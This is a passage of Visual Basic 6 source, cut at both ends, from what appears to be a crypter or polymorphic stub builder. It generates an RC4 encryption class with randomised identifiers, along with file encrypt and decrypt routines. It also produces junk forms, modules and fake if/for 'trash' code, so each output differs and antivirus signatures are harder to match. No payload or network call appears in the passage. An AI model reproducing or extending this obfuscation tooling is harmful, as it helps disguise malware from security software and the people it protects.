    RndStrings Rc_Var5
    RndStrings Rc_Var6
    RndStrings Rc_Var7
    RndStrings Rc_Var8
    RndStrings Rc_Var9
    RndStrings Rc_Var10
    RndStrings Rc_Var11
    RndStrings Rc_Var12
    RndStrings Rc_Var13
    RndStrings Rc_Var14
    RndStrings Rc_Var16
    RndStrings Rc_Var17
    RndStrings Rc_Var18
    
    
a = "VERSION 1.0 CLASS " & vbCrLf
a = a + "Begin " & vbCrLf
a = a + "Multiuse = -1 " & vbCrLf
a = a + "Persistable = 0 " & vbCrLf
a = a + " DataBindingBehavior = 0 " & vbCrLf
a = a + "DataSourceBehavior = 0 " & vbCrLf
a = a + " MTSTransactionMode = 0 " & vbCrLf
a = a + "End " & vbCrLf
a = a + "Attribute VB_Name = hahaha " & vbCrLf
a = a + "Attribute VB_GlobalNameSpace = False " & vbCrLf
a = a + "Attribute VB_Creatable = True" & vbCrLf
a = a + "Attribute VB_PredeclaredId = False " & vbCrLf
a = a + "Attribute VB_Exposed = False " & vbCrLf & vbCrLf
    
    a = a + "option explicit " & vbCrLf & vbCrLf
    a = a + "Event Progress(Percent as long) " & vbCrLf & vbCrLf
    a = a + "Private " + Rc_Var1 + " as string " & vbCrLf
    a = a + "private " + Rc_Var2 + "(0 to 255) as integer " & vbCrLf
    a = a + "Private " + Rc_Var3 + "() as byte " & vbCrLf
    a = a + "private " + Rc_Var4 + " as long " & vbCrLf
    a = a + "private " + Rc_Var5 + " as long " & vbCrLf
    a = a & vbCrLf & vbCrLf

' ENCRYPTFILE

    a = a + "public Function " + TxtFunc(7) + "(" + Rc_Var6 + " as string, " + Rc_Var7 + " as string, " + Rc_Var8 + " as boolean, Optional " + Rc_Var9 + " as string) as boolean " & vbCrLf
    a = a + "On error goto " + Rc_Var10 & vbCrLf & vbCrLf
    a = a + "if " + TxtSub(4) + "(" + Rc_Var6 + ") = false then " & vbCrLf + TxtFunc(7) + " = false " & vbCrLf + " exit function " & vbCrLf
    a = a + "end if " & vbCrLf
    a = a + "If " + TxtSub(4) + "(" + Rc_Var7 + ") = True And " + Rc_Var8 + " = False Then" & vbCrLf
    a = a + "end if " & vbCrLf
       
    a = a + "Dim " + Rc_Var11 + " as integer, " + Rc_Var12 + "() as byte " & vbCrLf
    a = a + Rc_Var11 + " = FreeFile " & vbCrLf
    a = a + "open " + Rc_Var6 + " for binary as #" + Rc_Var11 & vbCrLf
    a = a + "Redim " + Rc_Var12 + "(0 to lof(" + Rc_Var11 + ") - 1)" & vbCrLf
    a = a + "Get #" + Rc_Var11 + ", , " + Rc_Var12 + "()" & vbCrLf + " Close #" + Rc_Var11 & vbCrLf
    a = a + "Call " + TxtSub(11) + "(" + Rc_Var12 + "()," + Rc_Var9 + ")" & vbCrLf
    a = a + "if " + TxtSub(4) + "(" + Rc_Var7 + ") = true then kill " + Rc_Var7 & vbCrLf
    a = a + Rc_Var11 + " = FreeFile " & vbCrLf
    a = a + "open " + Rc_Var7 + " for binary as #" + Rc_Var11 & vbCrLf
    a = a + "put #" + Rc_Var11 + ", , " + Rc_Var12 + "()" & vbCrLf + " Close #" + Rc_Var11 & vbCrLf
    a = a + TxtFunc(7) + " = true " & vbCrLf + " exit function " & vbCrLf & vbCrLf
    a = a + Rc_Var10 + ":" & vbCrLf
    a = a + TxtFunc(7) + " = false " & vbCrLf + " End Function " & vbCrLf & vbCrLf
' END FUNCTION

' DECRYPTFILE

a = a + "public Function " + TxtFunc(8) + "(" + Rc_Var6 + " as string, " + Rc_Var7 + " as string, " + Rc_Var8 + " as boolean, Optional " + Rc_Var9 + " as string) as boolean " & vbCrLf
a = a + "On error goto " + Rc_Var10 & vbCrLf & vbCrLf
a = a + "if " + TxtSub(4) + "(" + Rc_Var6 + ") = false then " & vbCrLf + TxtFunc(8) + " = false " & vbCrLf + " exit function " & vbCrLf
a = a + "end if " & vbCrLf

a = a + "If " + TxtSub(4) + "(" + Rc_Var7 + ") = true then " & vbCrLf + TxtFunc(8) + " = false " & vbCrLf + " exit function " & vbCrLf
a = a + "end if " & vbCrLf
a = a + "Dim " + Rc_Var11 + " as integer, " + Rc_Var12 + "() as byte " & vbCrLf
a = a + Rc_Var11 + " = FreeFile " & vbCrLf

a = a + "open " + Rc_Var6 + " for binary as #" + Rc_Var11 & vbCrLf
a = a + "redim " + Rc_Var12 + "(0 to lof(" + Rc_Var11 + ") -1)" & vbCrLf
a = a + "Get #" + Rc_Var11 + ", , " + Rc_Var12 + "()" & vbCrLf + " Close #" + Rc_Var11 & vbCrLf

a = a + "Call " + TxtSub(12) + "(" + Rc_Var12 + "()," + Rc_Var9 + ")" & vbCrLf
a = a + "if " + TxtSub(4) + "(" + Rc_Var7 + ") = true then kill " + Rc_Var7 & vbCrLf
a = a + Rc_Var11 + " = freefile " & vbCrLf
a = a + "open " + Rc_Var7 + " for binary as #" + Rc_Var11 & vbCrLf
a = a + "put #" + Rc_Var11 + ", , " + Rc_Var12 + "()" & vbCrLf
a = a + " Close #" + Rc_Var11 & vbCrLf
a = a + TxtFunc(8) + " = true " & vbCrLf + "exit function " & vbCrLf

a = a + Rc_Var10 + ":" & vbCrLf
a = a + TxtFunc(8) + " = False " & vbCrLf
a = a + "End Function " & vbCrLf & vbCrLf

a = a + "public sub " + TxtSub(12) + "(" + Rc_Var3 + "() as byte, optional " + Rc_Var9 + " as String )" & vbCrLf
a = a + "Call " + TxtSub(11) + "(" + Rc_Var3 + "(), " + Rc_Var9 + ")" & vbCrLf
a = a + "end sub " & vbCrLf

' ENCRYPTSTRING
a = a + "public function " + TxtSub(13) + "(" + Rc_Var13 + " as string, optional " + Rc_Var9 + " as string, optional " + Rc_Var14 + " as boolean)as string " & vbCrLf
a = a + "Dim " + Rc_Var3 + "() as byte " & vbCrLf
a = a + Rc_Var3 + "() = strconv(" + Rc_Var13 + ", vbfromunicode)" & vbCrLf
a = a + "Call " + TxtSub(11) + "(" + Rc_Var3 + "(), " + Rc_Var9 + ")" & vbCrLf
a = a + TxtSub(13) + " = StrConv(" + Rc_Var3 + "(), VbUnicode) " & vbCrLf
a = a + "if " + Rc_Var14 + " = true then " + TxtSub(13) + " = " + Rc_Var18 + "(" + TxtSub(13) + ")" & vbCrLf
a = a + "end function" & vbCrLf & vbCrLf
' END FUNCTION

' DECRYPTSTRING
a = a + "public function " + TxtSub(0) + "(" + Rc_Var13 + " as string, optional " + Rc_Var9 + " as string, optional " + Rc_Var16 + " as boolean)as string " & vbCrLf
a = a + "Dim " + Rc_Var3 + "() as byte " & vbCrLf
a = a + "if " + Rc_Var16 + " = true then " + Rc_Var13 + " = " + Rc_Var17 + "(" + Rc_Var13 + ")" & vbCrLf
a = a + Rc_Var3 + "() = strconv(" + Rc_Var13 + ", vbfromunicode)" & vbCrLf
a = a + "Call " + TxtSub(12) + "(" + Rc_Var3 + "(), " + Rc_Var9 + ")" & vbCrLf
a = a + TxtSub(0) + " = StrConv(" + Rc_Var3 + "(), VbUnicode) " & vbCrLf
a = a + "end function" & vbCrLf & vbCrLf
' END FUNCTION

DoEvents
' ENCRYPT BYTE
Dim Eb1 As String, Eb2 As String, Eb3 As String, Eb4 As String, Eb5 As String, Eb6 As String, Eb7 As String, Eb8 As String, Eb9 As String, Eb10 As String, EB11 As String, EB12 As String, EB13 As String, EB14 As String

RndStrings Eb1
RndStrings Eb2
RndStrings Eb3
RndStrings Eb4
RndStrings Eb5
RndStrings Eb6
RndStrings Eb7
RndStrings Eb8
RndStrings Eb9
RndStrings Eb10
RndStrings EB11
RndStrings EB12
RndStrings EB13


a = a + "Public Sub " + TxtSub(11) + "(" + Rc_Var3 + "() as byte, optional " + Rc_Var9 + " as string)" & vbCrLf

a = a + "Dim " + Eb1 + " as long " & vbCrLf                 'I
a = a + "Dim " + Eb2 + " as long " & vbCrLf                 'J
a = a + "Dim " + Eb3 + " as byte " & vbCrLf                 'Temp
a = a + "Dim " + Eb4 + " as long " & vbCrLf                 'Offset
a = a + "Dim " + Eb5 + " as long " & vbCrLf                 'OrigLen
a = a + "Dim " + Eb6 + " as long " & vbCrLf                 'CipherLen
a = a + "Dim " + Eb7 + " as long " & vbCrLf                 'CurrPercent
a = a + "Dim " + Eb8 + " as long " & vbCrLf                 'NextPercent
a = a + "Dim " + Eb9 + "(0 to 255) as integer " & vbCrLf    'sBox

a = a + "if (len(" + Rc_Var9 + ") > 0) then me." + Rc_Var9 + " = " + Rc_Var9 & vbCrLf
a = a + "Call CpyMem(" + Eb9 + "(0), " + Rc_Var2 + "(0), 512) " & vbCrLf
a = a + Eb5 + " = Ubound(" + Rc_Var3 + ") + 1" & vbCrLf
a = a + Eb6 + " = " + Eb5 & vbCrLf

a = a + "For " + Eb4 + " = 0 to (" + Eb5 + " -1 )" & vbCrLf
a = a + Eb1 + " = (" + Eb1 + " + 1) Mod 256 " & vbCrLf
a = a + Eb2 + " = (" + Eb2 + " + " + Eb9 + "(" + Eb1 + ")) Mod 256 " & vbCrLf
a = a + Eb3 + " = " + Eb9 + "(" + Eb1 + ")" & vbCrLf
a = a + Eb9 + "(" + Eb1 + ")" + " = " + Eb9 + "(" + Eb2 + ")" & vbCrLf
a = a + Eb9 + "(" + Eb2 + ")" + " = " + Eb3 & vbCrLf
a = a + Rc_Var3 + "(" + Eb4 + ") = " + Rc_Var3 + "(" + Eb4 + ") Xor (" + Eb9 + "((" + Eb9 + "(" + Eb1 + ") + " + Eb9 + "(" + Eb2 + ")) Mod 256))" & vbCrLf
a = a + "If (" + Eb4 + " >= " + Eb8 + ") then " & vbCrLf
a = a + Eb7 + " = int((" + Eb4 + " / " + Eb6 + ") * 100)" & vbCrLf
a = a + Eb8 + " = (" + Eb6 + " * ((" + Eb7 + " + 1) / 100)) + 1" & vbCrLf
a = a + "RaiseEvent Progress(" + Eb7 + ")" & vbCrLf + " End If " & vbCrLf + " next " & vbCrLf
a = a + "if (" + Eb7 + " <> 100) then RaiseEvent Progress(100)" & vbCrLf
a = a + "end sub " & vbCrLf & vbCrLf
' END FUNCTION

' RESEND
a = a + " Private Sub " + GenNumKey(20) + "()" & vbCrLf
a = a + Rc_Var4 + " = 0 " & vbCrLf
a = a + Rc_Var5 + " = 1024 " & vbCrLf
a = a + "Redim " + Rc_Var3 + "(" + Rc_Var5 + ")" & vbCrLf
a = a + "end sub" & vbCrLf & vbCrLf
' END FUNCTION


DoEvents

' APPEND
Dim RcaVar1 As String
Dim RcaVar2 As String
Dim RcaVar3 As String
Dim RcaVar4 As String

RndStrings RcaVar1
RndStrings RcaVar2
RndStrings RcaVar3
RndStrings RcaVar4

a = a + "Private Sub " + TxtSub(14) + "(Byref " + RcaVar1 + " as string, Optional " + RcaVar2 + " as long)" & vbCrLf
a = a + "Dim " + RcaVar3 + " as long " & vbCrLf
a = a + "if " + RcaVar2 + " > 0 then " + RcaVar3 + " = " + RcaVar2 + " Else " + RcaVar3 + " = len(" + RcaVar1 + ")" & vbCrLf
a = a + "if " + RcaVar3 + " + " + Rc_Var4 + " > " + Rc_Var5 + " then " & vbCrLf
a = a + Rc_Var5 + " = " + Rc_Var5 + " + 1024 " & vbCrLf + "Redim Preserve " + Rc_Var3 + "(" + Rc_Var5 + ")" & vbCrLf + "End if " & vbCrLf
a = a + "CpyMem ByVal VarPtr(" + Rc_Var3 + "(" + Rc_Var4 + ")), ByVal " + RcaVar1 + ", " + RcaVar3 & vbCrLf
a = a + Rc_Var4 + " = " + Rc_Var4 + " + " + RcaVar3 & vbCrLf
a = a + "End Sub " & vbCrLf & vbCrLf
' END FUNCTION

DoEvents
Dim De_Var1 As String ' Data
Dim De_Var2 As String ' Gdata
Dim De_Var3 As String ' Stemp

RndStrings De_Var1
RndStrings De_Var2
RndStrings De_Var3


a = a + "Private function " + Rc_Var17 + "(" + De_Var1 + ") as string " & vbCrLf
a = a + "dim " + TxtSub(15) + " as double " & vbCrLf + "Reset " & vbCrLf
a = a + "for " + TxtSub(15) + " = 1 to len(" + De_Var1 + ") step 2 " & vbCrLf
a = a + vbCr + TxtSub(14) + " Chr$(Val(""&H"" & Mid$(" + De_Var1 + ", " + TxtSub(15) + ", 2))) " & vbCrLf
a = a + "Next " & vbCrLf + Rc_Var17 + " = " + TxtSub(15) & vbCrLf + " Reset " & vbCrLf
a = a + "End Function " & vbCrLf & vbCrLf

a = a + "Private function " + Rc_Var18 + "(" + De_Var1 + ") as string " & vbCrLf
a = a + "dim " + De_Var2 + " as double," + De_Var3 + " as String " & vbCrLf + "Reset " & vbCrLf
a = a + "For " + De_Var2 + " = 1 to len(" + De_Var1 + ")" & vbCrLf
a = a + De_Var3 + " = Hex$(Asc(Mid$(" + De_Var1 + "," + De_Var2 + ", 1))) " & vbCrLf
a = a + "if len(" + De_Var3 + ") < 2 then " + De_Var3 + " = ""0"" & " + De_Var3 & vbCrLf
a = a + TxtSub(14) + " " + De_Var3 & vbCrLf
a = a + "Next " & vbCrLf
a = a + Rc_Var18 + " = " + De_Var2 & vbCrLf + " Reset " & vbCrLf + " end function " & vbCrLf

DoEvents
Dim Pv1 As String
Dim Pv2 As String
Dim Pv3 As String
Dim Pv4 As String
Dim Pv5 As String
Dim Pv6 As String
Dim Pv7 As String

RndStrings Pv1
RndStrings Pv2
RndStrings Pv3
RndStrings Pv4
RndStrings Pv5
RndStrings Pv6
RndStrings Pv7

a = a + "public Property Let " + Rc_Var9 + "(" + Pv1 + " as string)" & vbCrLf
a = a + "Dim " + Pv2 + " as long," + Pv3 + " as long," + Pv4 + " as byte," + Pv5 + "() as byte, " + Pv6 + " as long " & vbCrLf
a = a + "if (" + Rc_Var1 + " = " + Pv1 + ") then exit property " & vbCrLf
a = a + Rc_Var1 + " = " + Pv1 & vbCrLf
a = a + Pv5 + "() = StrConv(" + Rc_Var1 + ", VbFromUnicode)" & vbCrLf
a = a + Pv6 + " = len(" + Rc_Var1 + ")" & vbCrLf
a = a + "For " + Pv2 + " = 0 to 255 " & vbCrLf
a = a + Rc_Var2 + "(" + Pv2 + ") = " + Pv2 & vbCrLf
a = a + "next " + Pv2 & vbCrLf
a = a + "For " + Pv2 + " = 0 to 255 " & vbCrLf
a = a + Pv3 + " = (" + Pv3 + " + " + Rc_Var2 + "(" + Pv2 + ") + " + Pv5 + "(" + Pv2 + " mod " + Pv6 + ")) mod 256 " & vbCrLf
a = a + Pv4 + " = " + Rc_Var2 + "(" + Pv2 + ")" & vbCrLf
a = a + Rc_Var2 + "(" + Pv2 + ") = " + Rc_Var2 + "(" + Pv3 + ")" & vbCrLf
a = a + Rc_Var2 + "(" + Pv3 + ") = " + Pv4 & vbCrLf + " next " & vbCrLf + " End property " & vbCrLf & vbCrLf

m_RC4 = a

End Function

Public Function m_RC41()

Dim a As String

Dim PP1 As String
Dim PP2 As String
Dim PP3 As String
Dim PP4 As String
Dim PP5 As String
Dim PP6 As String
Dim PP7 As String
Dim PP8 As String
Dim PP9 As String
Dim PP10 As String

RndStrings PP1
RndStrings PP2
RndStrings PP3
RndStrings PP4
RndStrings PP5
RndStrings PP6
RndStrings PP7
RndStrings PP8
RndStrings PP9
RndStrings PP10

a = "Attribute VB_Name = " & """" + GenNumKey(15) + """" + vbCrLf
    
a = a + "Public Function " + TxtFunc(9).Text + "(Byval " + PP1 + " as String, ByVal " + PP2 + " as string) as string " + S1

a = a + "On Error Resume Next " + S1

a = a + Trash7(2) + S1

a = a + "Dim " + PP3 + "(0 to 255) as integer" + S1 'dark3tesa
a = a + "Dim " + PP4 + " as long " + S1 'sdnfolakw34r
a = a + "Dim " + PP5 + " as long " + S1 'hwnjk2q3erw
a = a + "Dim " + PP6 + " as long " + S1 'piowua4h3qjwrsd
a = a + "Dim " + PP7 + "() as Byte " + S1 'CFJRQihjnrkqars
a = a + "Dim " + PP8 + "() as Byte " + S1 'YTMKijsduhjngamkf
a = a + "Dim " + PP9 + " as Byte " + S1 + S1 'DFRAetnfijak

a = a + Trash3 + S1

a = a + "if Len(" + PP2 + ") = 0 then Exit Function " + S1

a = a + Trash3 + S1

a = a + "if Len(" + PP1 + ") = 0 then Exit Function " + S1 + S1

If Check21.Value = 1 Then a = a + Trash2 + S1

If Check9.Value = 1 Then a = a + Trash3 + S1

a = a + "if len(" + PP2 + ") > 256 then " + S1
If Check9.Value = 1 Then a = a + Trash3 + S1
a = a + "   " + PP7 + "() = StrConv(Left$(" + PP2 + ", 256), vbFromUnicode)" + S1
a = a + "Else " + S1

If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
End If

a = a + "   " + PP7 + "() = Strconv(" + PP2 + ", vbFromUnicode)" + S1
a = a + "End If " + S1 + S1

a = a + "for " + PP4 + " = 0 to 255" + S1
a = a + "   " + PP3 + "(" + PP4 + ") = " + PP4 + S1
a = a + "next " + PP4 + S1

If Check21.Value = 1 Then a = a + Trash2 + S1

a = a + PP4 + " = 0 " + S1
If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
End If
a = a + PP5 + " = 0 " + S1
If Check9.Value = 1 Then
If ComboBox1(2).ListIndex = 2 Then a = a + Trash3 + S1
End If
a = a + PP6 + " = 0 " + S1 + S1

a = a + Trash3 + S1

a = a + "For " + PP4 + " = 0 to 255 " + S1
If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
End If

a = a + "   " + PP5 + " = (" + PP5 + " + " + PP3 + "(" + PP4 + ") + " + PP7 + "(" + PP4 + " Mod Len(" + PP2 + "))) Mod 256 " + S1
a = a + "   " + PP9 + " = " + PP3 + "(" + PP4 + ")" + S1
a = a + "   " + PP3 + "(" + PP4 + ") = " + PP3 + "(" + PP5 + ")" + S1
a = a + "   " + PP3 + "(" + PP5 + ") = " + PP9 + S1
a = a + "next " + PP4 + S1 + S1

a = a + PP4 + " = 0 " + S1

If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
End If

If Check21.Value = 1 Then a = a + Trash2 + S1

a = a + PP5 + " = 0 " + S1
If Check9.Value = 1 Then
If ComboBox1(2).ListIndex = 2 Then a = a + Trash3 + S1
End If
a = a + PP6 + " = 0 " + S1 + S1

a = a + PP8 + "() = StrConv(" + PP1 + ", vbFromUnicode) " + S1

a = a + Trash6(2)

a = a + "   " + "For " + PP4 + " = 0 to Len(" + PP1 + ")" + S1
If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
End If

a = a + "       " + PP5 + " = (" + PP5 + " + 1) Mod 256 " + S1
a = a + "       " + PP6 + " = (" + PP6 + " + " + PP3 + "(" + PP5 + ")) Mod 256 " + S1
a = a + "       " + PP9 + " = " + PP3 + "(" + PP5 + ")" + S1
a = a + "       " + PP3 + "(" + PP5 + ") = " + PP3 + "(" + PP6 + ")" + S1
a = a + "       " + PP3 + "(" + PP6 + ") = " + PP9 + S1
a = a + "       " + PP8 + "(" + PP4 + ") = " + PP8 + "(" + PP4 + ") Xor (" + PP3 + "((" + PP3 + "(" + PP5 + ") + " + PP3 + "(" + PP6 + ")) Mod 256))" + S1
a = a + "   " + "Next " + PP4 + S1 + S1

If Check9.Value = 1 Then a = a + Trash3 + S1

If Check21.Value = 1 Then
If ComboBox1(6).ListIndex <= 1 Then a = a + Trash2 + S1
End If

a = a + TxtFunc(9).Text + " = StrConv(" + PP8 + ", vbUnicode)" + S1
a = a + "End Function" + S1

m_RC41 = a

End Function

Private Function GenMod(ModName As String) As String

Dim a               As String
Dim DetermineJunk   As Integer
Dim IntA            As String
Dim IntB            As String
Dim IntC            As String

Sleep (500)
    
a = "Attribute VB_Name = " & """" + ModName + """" + vbCrLf
        
Randomize
IntA = Int(Rnd * 2)

If IntA = 0 Then
    a = a + "private sub " + GenNumKey(18) + "()" & vbCrLf
Else
    a = a + "private Function " + GenNumKey(18) + "()" & vbCrLf
End If

For X = 1 To Int(Rnd * 4) + 2

DoEvents
Randomize

    DetermineJunk = Int(Rnd * 4)

If DetermineJunk = 0 Then

a = a + Trash1
   
End If

If DetermineJunk = 1 Then

a = a + Trash2

End If

If DetermineJunk = 2 Then
a = a + Trash3
End If

If DetermineJunk = 3 Then
   
a = a + Trash4

End If

Next X

If IntA = 0 Then
a = a + "end sub " & vbCrLf & vbCrLf
Else
a = a + "end Function " & vbCrLf & vbCrLf
End If

GenMod = a
        
        
End Function

Private Function GenCls(ClassName As String) As String


Dim a As String
Dim DetermineJunk As Integer
Dim IntA As String
Dim IntB As String
Dim IntC As String

Sleep (500)

Randomize
IntA = Int(Rnd * 2)

a = "VERSION 1.0 CLASS " & vbCrLf
a = a + "Begin " & vbCrLf
a = a + "Multiuse = -1 " & vbCrLf
a = a + "Persistable = 0 " & vbCrLf
a = a + " DataBindingBehavior = 0 " & vbCrLf
a = a + "DataSourceBehavior = 0 " & vbCrLf
a = a + " MTSTransactionMode = 0 " & vbCrLf
a = a + "End " & vbCrLf
a = a + "Attribute VB_Name = " + ClassName & vbCrLf
a = a + "Attribute VB_GlobalNameSpace = False " & vbCrLf
a = a + "Attribute VB_Creatable = True" & vbCrLf
a = a + "Attribute VB_PredeclaredId = False " & vbCrLf
a = a + "Attribute VB_Exposed = False " & vbCrLf & vbCrLf


If IntA = 0 Then
    a = a + "private sub " + GenNumKey(18) + "()" & vbCrLf
Else
    a = a + "private Function " + GenNumKey(18) + "()" & vbCrLf
End If

For X = 1 To Int(Rnd * 4) + 2

DoEvents
Randomize

    DetermineJunk = Int(Rnd * 4)

If DetermineJunk = 0 Then

a = a + Trash1
   
End If

If DetermineJunk = 1 Then

a = a + Trash2

End If

If DetermineJunk = 2 Then
a = a + Trash3
End If

If DetermineJunk = 3 Then
   
a = a + Trash4

End If

Next X

If IntA = 0 Then
a = a + "end sub " & vbCrLf & vbCrLf
Else
a = a + "end Function " & vbCrLf & vbCrLf
End If

GenCls = a

End Function


Function GenFrm(FormName As String) As String


Dim a As String
Dim DetermineJunk As Integer
Dim IntA As String
Dim IntB As Integer
Dim IntC As String
Dim IntTxt As Integer

Sleep (500)

IntC = GenNumKey(10)

Randomize
IntA = Int(Rnd * 2)
Randomize
IntB = Int(Rnd * 12) + 1
Randomize
IntTxt = Int(Rnd * 12) + 1

a = a + "Version 5.00" & vbCrLf
    a = a + "Object = ""{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.0#0""; ""Codejock.Controls.v13.0.0.ocx""" & vbCrLf
    a = a + "Begin VB.Form " + IntC & vbCrLf
    a = a + "Caption = ""Form1""" & vbCrLf
    a = a + " ClientHeight = 4020" & vbCrLf
    a = a + "ClientLeft = 120" & vbCrLf
    a = a + "ClientTop = 420" & vbCrLf
    a = a + "ClientWidth = 8220" & vbCrLf
    a = a + "LinkTopic = ""Form1""" & vbCrLf
    a = a + "ScaleHeight = 4020" & vbCrLf
    a = a + "ScaleWidth = 8220" & vbCrLf
    a = a + "StartUpPosition = 3" & vbCrLf
    
    For z = 1 To IntB
        a = a + "Begin VB.CommandButton " + GenNumKey(13) & vbCrLf
        a = a + "Caption = " + """" + GenNumKey(18) + """" & vbCrLf
        a = a + "Height = " & RandomNumber(500) & vbCrLf
        a = a + "Left = " & RandomNumber(2000) & vbCrLf
        a = a + "TabIndex = 1" & vbCrLf
        a = a + "Top = " & RandomNumber(2000) & vbCrLf
        a = a + "Width = " & RandomNumber(2000) & vbCrLf
        a = a + "End" & vbCrLf
    Next z
    
    Sleep (500)
    
    For z = 1 To IntTxt
        a = a + " Begin VB.TextBox " + GenNumKey(15) & vbCrLf
        a = a + "text = " + """" + GenNumKey(100) + """" & vbCrLf
        a = a + "Height = " & RandomNumber(5000) & vbCrLf
        a = a + "Left = " & RandomNumber(2000) & vbCrLf
        a = a + "MultiLine = -1" & vbCrLf
        a = a + "TabIndex = 0" & vbCrLf
        a = a + "Top = " & RandomNumber(2000) & vbCrLf
        a = a + "Width = " & RandomNumber(8000) & vbCrLf
        a = a + "End" & vbCrLf
    Next z
    
    For z = 1 To IntTxt
    
        a = a + "Begin VB.PictureBox " + GenNumKey(20) & vbCrLf
        a = a + "Height = " & RandomNumber(900) & vbCrLf
        a = a + "Left = " & RandomNumber(3000) & vbCrLf
        a = a + "ScaleHeight = " & RandomNumber(500) & vbCrLf
        a = a + "ScaleWidth = " & RandomNumber(2500) & vbCrLf
        a = a + "TabIndex = 0" & vbCrLf
        a = a + "Top = " & RandomNumber(450) & vbCrLf
        a = a + "Width = " & RandomNumber(3500) & vbCrLf
        a = a + "End" & vbCrLf & vbCrLf
    Next z
    
    For z = 1 To IntTxt
        a = a + "Begin VB.Label " + GenNumKey(20) & vbCrLf
        a = a + "Caption = " + """" + GenNumKey(15) + """" & vbCrLf
        a = a + "Height = " & RandomNumber(2500) & vbCrLf
        a = a + "Left = " & RandomNumber(13000) & vbCrLf
        a = a + "TabIndex = 0" & vbCrLf
        a = a + "Top = " & RandomNumber(4000) & vbCrLf
        a = a + "Width = " & RandomNumber(800) & vbCrLf
        a = a + "End" & vbCrLf
    Next z
    
a = a + "End" & vbCrLf
a = a + "Attribute VB_Name = " + FormName & vbCrLf
a = a + "Attribute VB_GlobalNameSpace = False" & vbCrLf
a = a + "Attribute VB_Creatable = False" & vbCrLf
a = a + "Attribute VB_PredeclaredId = True" & vbCrLf
a = a + "Attribute VB_Exposed = False" & vbCrLf


If IntA = 0 Then
    a = a + "private sub " + GenNumKey(18) + "()" & vbCrLf
Else
    a = a + "private Function " + GenNumKey(18) + "()" & vbCrLf
End If

For X = 1 To Int(Rnd * 4) + 2

DoEvents
Randomize

    DetermineJunk = Int(Rnd * 4)

If DetermineJunk = 0 Then

a = a + Trash1
   
End If

If DetermineJunk = 1 Then

a = a + Trash2

End If

If DetermineJunk = 2 Then
a = a + Trash3
End If

If DetermineJunk = 3 Then
   
a = a + Trash4

End If

Next X

If IntA = 0 Then
a = a + "end sub " & vbCrLf & vbCrLf
Else
a = a + "end Function " & vbCrLf & vbCrLf
End If

GenFrm = a

End Function

Function GenFunction(Density As Integer) As String


Randomize
Dim a As String
Dim IntF1 As Integer
Dim CurrentDensity As Integer

Sleep (500)

Randomize
IntF1 = Int(Rnd * 3) + 2
    
If IntF1 = 1 Then
a = a + "private Function " + GenNumKey(RandomNumber(33, 27), 12) & vbCrLf
Else
a = a + "public function " + GenNumKey(RandomNumber(31, 25), 17) & vbCrLf
End If

DoEvents
For z = 1 To Int(4 * Rnd) + 2
DoEvents

Randomize
CurrentDensity = Int(Density * Rnd) + 1

DoEvents

    Randomize
    If CurrentDensity = 1 Then a = a + Trash6(Int(Rnd * 5) + 1) & vbCrLf

DoEvents
    Randomize
    If CurrentDensity = 3 Then a = a + Trash1 & vbCrLf

DoEvents
    Randomize
    If CurrentDensity = 2 Then a = a + Trash2 & vbCrLf

DoEvents
    Randomize
    If CurrentDensity = 1 Then a = a + Trash3 & vbCrLf

DoEvents
    Randomize
    If CurrentDensity = 2 Then a = a + Trash4 & vbCrLf

DoEvents
    Randomize
    If CurrentDensity = 3 Then a = a + Trash5 & vbCrLf
      
    Next z
    
    a = a + "end function" & vbCrLf & vbCrLf
    
GenFunction = a

Sleep (500)


End Function

Function GenSub(Density As Integer) As String

Randomize

    Dim TSDy As String
    Dim IntF1 As Integer

Sleep (500)

IntF1 = Int(Rnd * 2) & vbCrLf
    
    If IntF1 = 1 Then
    TSDy = TSDy + "private sub " + GenNumKey(RandomNumber(32, 26), 19) & vbCrLf
    Else
    TSDy = TSDy + "public sub " + GenNumKey(RandomNumber(34, 28), 16) & vbCrLf
    End If
    
Sleep (500)
For z = 1 To Int(4 * Rnd) + 2
Randomize
DoEvents
    
    Dim C1 As Integer
    Randomize
    C1 = Int(Rnd * 5) + 1
    
        If C1 = 1 Then TSDy = TSDy + Trash6(Int(Rnd * 5) + 1) & vbCrLf
        
        If C1 = 2 Then TSDy = TSDy + Trash1 & vbCrLf
        
        If C1 = 3 Then TSDy = TSDy + Trash2 & vbCrLf
        
        If C1 = 4 Then TSDy = TSDy + Trash3 & vbCrLf
        
        If C1 = 5 Then TSDy = TSDy + Trash4 & vbCrLf
        
        If C1 = 6 Then TSDy = TSDy + Trash5 & vbCrLf
        
    Next z

TSDy = TSDy + "end Sub" & vbCrLf & vbCrLf

GenSub = TSDy

Sleep (500)

End Function

Function Trash1() As String ' Fake If Statements

Dim BBD As String
Dim Int15 As String
Dim Int16 As String

Sleep (200)

Randomize

Int15 = GenNumKey(RandomNumber(35, 24), 19)
Int16 = GenNumKey(RandomNumber(36, 27), 24)

 BBD = BBD + "Dim " + Int15 + " as string" & vbCrLf
    BBD = BBD + Int15 + " = " + """" + GenNumKey(25, 10) + """" & vbCrLf
    BBD = BBD + "if " + Int15 + " = " + """" + GenNumKey(45, 10) + """" + " then " & vbCrLf
    BBD = BBD + "goto " + Int16 & vbCrLf
    BBD = BBD + Int16 + ":" & vbCrLf
    BBD = BBD + "else " & vbCrLf
    BBD = BBD + Int15 + " = " + """" + GenNumKey(35, 27) + """" & vbCrLf + " end if " & vbCrLf
Trash1 = BBD

End Function

Function Trash2() As String ' Fake For/Next Statements
Dim FAERQW As String
Dim skldjfqs As String
Dim GAj4iew As String
Dim ssdtrjaerf As String

Sleep (200)

Randomize
skldjfqs = GenNumKey(RandomNumber(30, 23), 17)
Randomize
GAj4iew = GenNumKey(RandomNumber(30, 26), 9)
Randomize
ssdtrjaerf = GenNumKey(RandomNumber(30, 27), 20)
Randomize

    FAERQW = FAERQW + "Dim " + skldjfqs + " as integer " & vbCrLf
    FAERQW = FAERQW + "For " + skldjfqs + " = 1 to 9 " & vbCrLf
    FAERQW = FAERQW + "DoEvents" & vbCrLf
    FAERQW = FAERQW + skldjfqs + " = " + skldjfqs + " + 1 " & vbCrLf
